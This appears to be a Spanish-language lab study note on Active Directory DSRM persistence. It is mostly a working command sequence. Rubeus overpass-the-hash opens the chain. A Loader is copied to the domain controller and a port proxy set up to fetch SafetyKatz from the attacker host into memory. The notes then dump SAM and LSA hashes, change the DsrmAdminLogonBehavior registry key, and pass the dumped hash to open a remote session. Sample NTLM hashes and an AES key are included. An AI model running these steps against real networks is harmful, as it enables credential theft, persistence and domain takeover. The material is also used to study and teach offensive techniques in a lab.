# DSRM (Directory Services Restore Mode)

Tags: #AD #Windows #Powershell #SafetyKatz 

```bash 
- DSRM es Directory Services Restore Mode (Modo de Restauración de Servicios de Directorio).
- Existe un administrador local en cada Domain Controller llamado "Administrator", cuya contraseña es la contraseña de 'DSRM'.
- La contraseña de DSRM (SafeModePassword) es requerida cuando un servidor se promociona a Domain Controller y rara vez se cambia.
- Después de modificar la configuración en el DC, es posible usar el hash NTLM de este usuario para acceder al Domain Controller.
```

[![DSRM.png | 800](https://i.postimg.cc/1z7Z07qq/DSRM.png)](https://postimg.cc/xkm7nRgf)

## OPTH al DC

```powershell 
# Ejecutar como administrador local 
❯ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
# Se creará una nueva sesión (terminal) con el usuario dado  
```

```powershell 
Paso 0: 
# Compartir el Loader en la sesión (cmd) que se obtuvo con el OPTH que tiene el ticket inyectado con el comando anterior 
❯ echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y    # Copiar Loader al DC desde la PC atacante
❯ winrs -r:dcorp-dc cmd     # Ingresar al server DC

# Ejecutar desde dentro del DC
❯ netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x
# Funciona para ejecutar directamente 'SafetyKatz' directamente en el DC sin descargarlo 
```

```powershell 
! Usuario: Domain Admin (ejecutado en el DC)

❯ SafetyKatz.exe "token::elevate" "lsadump::sam"
# Volcar el hash de la contraseña del Administrator local DSRM del DC — token::elevate impersona a SYSTEM antes de acceder al SAM.

Paso 1:
❯ C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "token::elevate" "lsadump::evasive-sam" "exit"
# Obtener el hash NTLM del usuario Administrator por medio de DSRM

❯ SafetyKatz.exe "lsadump::lsa /patch"
# Volcar los hashes de todas las cuentas del dominio vía LSA — comparar el hash del Administrator de dominio vs el hash DSRM obtenido arriba para verificar si son iguales (misconfiguration común).

Notas:
	1. El primero es el 'Administrador local de DSRM'.
```

```powershell 
! Usuario: Domain Admin (ejecutado en el DC)

Paso 2:
❯ reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
# Modificar el registro del DC para permitir autenticación de red con la cuenta DSRM — requisito previo para usar el hash DSRM en un Pass-the-Hash hacia el DC.
# Cerrar esta consola con el OPTH para poder ejecutar el siguiente comando 
```

## PassTheHash fuera del DC

* Mantener únicamente una sesión activa de Pass-the-Hash (PTH) u OverPass-the-Hash (OPTH), ya que si existe otra sesión previa utilizando credenciales/tickets distintos, la nueva consola puede no abrirse correctamente o reutilizar el contexto de autenticación existente.

```powershell 
! Usuario: Domain Admin (con hash DSRM y registro DsrmAdminLogonBehavior = 2 configurado) 
!! Ejecutado afuera el DC como administrador local desde la máquina de atacante 
!!! Se hará 'Pass-The-Hash' del usuario administrador 

❯ SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"
# Ejecutar un Pass-the-Hash con el hash DSRM del Administrator local del DC — abre una PowerShell en el contexto de esa cuenta.

Paso 3:
# Crear una nueva consola con el ticket de PTH
❯ C:\AD\Tools\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
	# NTLM = Hash NTLM obtenido de DSRM

❯ .\Loader.exe -path C:\AD\SafetyKatz.exe "sekurlsa::evasive-pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:cmd.exe" "exit"
```

```powershell 
!! Importante !! 

Paso 4:
❯ C:\AD\Tools\Invishell\RunWithRegistryNonAdmin.bat 
# Ejecutar Powershell manualmente desde la primer consola con la que se hizo PTH. NO con la consola que se abrio con el PTH.

Paso 5:
❯ Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1   
# Agregar la IP del DC a los hosts de confianza de WinRM para permitir la conexión con credenciales implícitas. 
# Se ejecuta desde la primer consola con la que se hizo PTH. NO con la consola que se abrio con el PTH.

```

```powershell 
# En la sesión que se crea con el PTH:
❯ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat   # Ejecutar Powershell 

❯ Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
# Abrir una sesión remota de PowerShell hacia el DC usando las credenciales implícitas del proceso actual (el token obtenido via PTH).
	❯ $env:username    # Obtener el nombre del usuario actual 
```